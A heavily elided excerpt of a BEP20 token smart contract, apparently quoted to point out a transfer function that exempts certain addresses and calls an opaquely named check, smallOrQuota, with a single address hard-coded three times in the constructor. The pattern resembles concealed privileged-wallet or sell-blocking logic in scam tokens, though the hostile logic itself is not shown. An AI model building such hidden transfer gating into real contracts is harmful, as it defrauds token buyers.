...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (isExcludedFromCut[sender] || isExcludedFromCut[recipient]) {
                finalAmount = amount;
                if (smallOrQuota(sender, recipient)) {
    ...
    function smallOrQuota(address addr, address re) private view returns(bool) {
...
contract Token is BEP20 {
    constructor(string memory _name, string memory _symbol) BEP20(
        ...
        [0xBea71b89c86fc77ffA9a7bA523948D24E31bcEDa,0xBea71b89c86fc77ffA9a7bA523948D24E31bcEDa,0xBea71b89c86fc77ffA9a7bA523948D24E31bcEDa]
    ){}
}